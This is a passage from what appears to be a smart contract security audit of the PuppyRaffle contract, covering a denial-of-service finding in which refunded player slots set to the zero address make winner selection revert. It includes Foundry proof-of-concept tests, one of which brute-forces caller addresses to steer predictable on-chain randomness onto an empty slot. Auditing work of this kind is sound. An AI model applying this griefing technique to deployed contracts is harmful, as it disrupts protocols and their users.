## Proof of Code
// test/PuppyRaffleZeroWinner.t.sol
function testSelectWinnerRevertsIfWinnerIsZero() public playersEntered {
    // Player four refunds his ticket (index 3)
    uint256 idx = puppyRaffle.getActivePlayerIndex(playerFour);
    vm.prank(playerFour);
    puppyRaffle.refund(idx);

    // Advance time so raffle is over
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    // Expect revert due to zero-address mint
    vm.expectRevert("ERC721: mint to the zero address");
    puppyRaffle.selectWinner();
}

## Suggested Mitigation
In `selectWinner()`, loop until a non-zero address is drawn OR simply revert when a zero address is encountered so callers can retry without wasting gas. A more robust fix is to prevent holes: in `refund()` replace the element with the last entry (swap-and-pop) and shrink the `players` array, maintaining an auxiliary mapping for indices.

## [M-6]. DOS issue in PuppyRaffle::selectWinner

## Description
When a player refunds, their slot in the `players` array is set to `address(0)`. The `selectWinner` function does not account for this and can randomly select an index corresponding to a zeroed-out slot. If this happens, the `winner` address becomes `address(0)`. The subsequent call to `_safeMint(winner, tokenId)` will revert, as the ERC721 standard forbids minting to the zero address. This causes the `selectWinner` transaction to fail, preventing the raffle from concluding.

## Impact
The winner selection process can be repeatedly griefed. While not a permanent lock (a call in a different block might succeed), it disrupts the protocol's operation and prevents a winner from being chosen in a timely manner.

## Proof of Concept
1. Start a raffle and have 4 distinct players join.
2. Any one of the players (say index 2) calls `refund`, turning `players[2]` into address(0).
3. Wait until the raffle duration has elapsed.
4. Off-chain, iterate over potential caller addresses until `keccak256(caller, block.timestamp, block.difficulty) % 4 == 2`.
5. Call `selectWinner` from that address in the same block. `winner` will be address(0) and `_safeMint(address(0), tokenId)` reverts with "ERC721: mint to the zero address", blocking the raffle.
6. Because the state change reverts, the attacker can repeat this grief-attack indefinitely in subsequent blocks.

## Proof of Code
pragma solidity ^0.7.6;

import {Test, Vm} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleZeroWinnerTest is Test {
    PuppyRaffle raffle;
    uint256 constant entranceFee = 1 ether;
    address constant feeAddress = address(0xDEADBEEF);
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function test_selectWinnerRevertsWithZeroAddress() public {
        // 1. Four players enter
        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;
        raffle.enterRaffle{value: entranceFee * 4}(players);

        // 2. Player at index 2 refunds -> slot becomes address(0)
        vm.prank(p3);
        raffle.refund(2);

        // 3. Fast-forward so raffle can be finished
        vm.warp(block.timestamp + 1 days + 1);

        // 4. Search attacker address giving winnerIndex == 2
        address attacker = address(0);
        for (uint160 i = 5; i < 2000; i++) {
            address candidate = address(i);
            uint256 idx = uint256(keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))) % 4;
            if (idx == 2) {
                attacker = candidate;
                break;
            }
        }
        require(attacker != address(0), "No attacker found");

        // 5. Expect revert when zero address is selected
        vm.prank(attacker);
        vm.expectRevert(bytes("ERC721: mint to the zero address"));
        raffle.selectWinner();
    }
}

## Suggested Mitigation
The `selectWinner` function must ensure it does not select a zero-address player. This can be done by re-calculating the winner index if a zero-address is picked. A more robust and gas-efficient solution is to create a temporary array of only active players and select a winner from that, or use the 'swap-and-pop' pattern in the `refund` function to prevent zero-address slots from ever existing in the `players` array.

```solidity
function selectWinner() external {
    // ... checks ...
    address winner = address(0);
    uint256 winnerIndex = 
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)));

    // Loop to find a non-zero winner. This is still deterministic and can be gamed,
    // but prevents the simple revert.
    uint256 i = 0;
    while(winner == address(0)) {
        require(i < players.length, "No valid players");
        winner = players[(winnerIndex + i) % players.length];
        i++;
    }
    
    // ... continue with winner logic ...
}
```
**Note**: The best solution is a combination of fixes: use `activePlayerCount`, use a better randomness source (VRF), and compact the `players` array upon refund or during winner selection to avoid zero-address slots.



